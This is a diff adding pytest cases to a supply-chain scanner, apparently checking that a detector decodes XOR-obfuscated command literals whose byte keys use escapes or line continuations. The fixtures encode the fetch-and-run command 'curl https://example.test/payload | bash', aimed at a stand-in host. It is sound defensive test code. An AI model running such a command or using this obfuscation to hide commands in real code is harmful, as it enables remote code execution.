@@ -2285,6 +2285,38 @@ class TestSupplyChainSafePatterns:
             for finding in findings
         )
 
+    @pytest.mark.parametrize("quote", ["'", '"'])
+    def test_unterminated_xor_key_backslashes_do_not_block_decoding(self, quote: str) -> None:
+        content = "def broken(values):\n    key = b" + quote + "\\" * 80
+        assert sc_mod._decoded_literal_xor_calls(content) == []
+
+    @pytest.mark.parametrize("key", [b"\\", b"'", b'"', b"\x9c", b"a\\'\x9c"])
+    def test_xor_decoder_preserves_escaped_literal_keys(self, key: bytes) -> None:
+        command = "curl https://example.test/payload | bash"
+        values = [value ^ key[index % len(key)] for index, value in enumerate(command.encode())]
+        literal = "".join(f"\\x{value:02x}" for value in key)
+        content = (
+            "def decode(values):\n"
+            f"    key = b'{literal}'\n"
+            "    return bytes(value ^ key[index % len(key)] "
+            "for index, value in enumerate(values)).decode('utf-8')\n"
+            f"decode({values!r})\n"
+        )
+        assert sc_mod._decoded_literal_xor_calls(content) == [(4, command)]
+
+    def test_xor_decoder_preserves_continued_literal_key(self) -> None:
+        key = b"a    b"
+        command = "curl https://example.test/payload | bash"
+        values = [value ^ key[index % len(key)] for index, value in enumerate(command.encode())]
+        content = (
+            "def decode(values):\n"
+            "    key = b'a" + "\\\n" + "    b'\n"
+            "    return bytes(value ^ key[index % len(key)] "
+            "for index, value in enumerate(values)).decode('utf-8')\n"
+            f"decode({values!r})\n"
+        )
+        assert sc_mod._decoded_literal_xor_calls(content) == [(5, command)]
+
     def test_sc2_xor_decoded_command_survives_unicode_line_separators(self) -> None:
         # The "\u2028" escapes below are actual U+2028 LINE SEPARATOR characters at
         # runtime. They make the decoder's logical line numbers exceed an LF-only
